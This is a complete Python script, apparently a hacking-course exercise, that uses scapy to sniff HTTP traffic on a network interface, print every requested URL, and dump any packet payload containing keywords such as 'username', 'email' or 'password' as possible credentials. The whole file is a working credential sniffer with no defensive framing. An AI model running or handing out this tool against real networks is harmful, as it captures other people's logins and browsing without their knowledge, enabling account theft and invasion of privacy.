import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface= interface, store =False,prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # Extracting the username and password the user entering
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["uname", "username", "login", "email", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_sniffed_packet(packet):
   # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        # Extracting the URL the user Entering
        url = get_url(packet)
        print("[+] HTTP Request >> "+ str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info)

sniff("eth0")